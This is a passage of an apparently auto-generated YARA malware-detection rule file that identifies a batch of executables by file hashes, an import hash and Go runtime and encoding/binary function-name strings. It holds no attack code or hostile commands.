      hash10 = "dd56a47d6b039b230286c0327d6693062fc843602ac0e3613214735503f798ed"
   strings:
      $s1 = "runtime.getproccount" fullword ascii /* score: '15.00'*/
      $s2 = "runtime.(*gcWork).tryGetFast" fullword ascii /* score: '12.00'*/
      $s3 = "runtime.(*gcWork).tryGet" fullword ascii /* score: '12.00'*/
      $s4 = "runtime.(*gcWork).put" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.runfinq" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.gcMarkRootPrepare.func1" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.atoi32" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.gcMarkRootPrepare" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.stringtoslicebyte" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.tracebackothers.func1" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.atoi" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.rawbyteslice" fullword ascii /* score: '10.00'*/
      $s13 = "tryGetFast" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__1fc8d079_d42595b695fc008ef2c56aabd8efd6_85 {
   meta:
      description = "_subset_batch - from files d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_1fc8d079.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_41b402ff.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_72d757ad.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_7610fe95.exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_979bd820.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d5227118354b0c6d70089730cf121de3ba51e0d9c9c478189559b9e93a890ac"
      hash2 = "1fc8d0798605394a2a0dbc39c80bf5221483668c22faf6782e5254cbbd90a1d3"
      hash3 = "41b402ff6d432fcff5fb710bfb271bdf8d7838eaad5d7f35aac354036b40f18b"
      hash4 = "72d757ad3719b02a93bb17b3600d349d98fcc283ef168300ba8660ca1f5601d0"
      hash5 = "7610fe95df2a433e8d52377e8301642dacb2e66b19d695f568a6b745d68fd3c5"
      hash6 = "979bd8203f5ad91bb5cd844c51045a244004d6c43c88e11af7bb56cf312dfa6f"
   strings:
      $s1 = "reflect.Value.SetComplex" fullword ascii /* score: '10.00'*/
      $s2 = "encoding/binary.(*decoder).skip" fullword ascii /* score: '9.00'*/
      $s3 = "encoding/binary.(*decoder).bool" fullword ascii /* score: '9.00'*/
      $s4 = "encoding/binary.decodeFast" fullword ascii /* score: '9.00'*/
      $s5 = "encoding/binary.(*decoder).int32" fullword ascii /* score: '9.00'*/
      $s6 = "encoding/binary.(*decoder).int64" fullword ascii /* score: '9.00'*/
      $s7 = "encoding/binary.(*decoder).uint8" fullword ascii /* score: '9.00'*/
      $s8 = "encoding/binary.(*decoder).value" fullword ascii /* score: '9.00'*/
      $s9 = "encoding/binary.(*decoder).int16" fullword ascii /* score: '9.00'*/
      $s10 = "encoding/binary.(*decoder).uint32" fullword ascii /* score: '9.00'*/
      $s11 = "encoding/binary.(*decoder).uint64" fullword ascii /* score: '9.00'*/
      $s12 = "encoding/binary.(*decoder).int8" fullword ascii /* score: '9.00'*/
      $s13 = "encoding/binary.(*decoder).uint16" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

